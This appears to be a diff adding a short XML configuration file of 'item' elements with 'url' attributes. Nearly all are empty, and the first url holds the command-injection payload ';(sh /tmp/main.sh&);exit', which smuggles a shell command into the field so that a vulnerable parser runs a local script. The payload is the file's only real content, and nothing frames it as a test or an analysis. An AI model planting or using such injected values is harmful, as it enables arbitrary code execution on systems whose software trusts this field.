@@ -1,0 +1,22 @@
+﻿<?xml version="1.0"?>
+<root>
+	<class type="1">
+		<item url=";(sh /tmp/main.sh&);exit"/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		<item url=""/>
+		</class>
+	<class type="2">
+		<item url=""/>
+	</class>		
+</root>
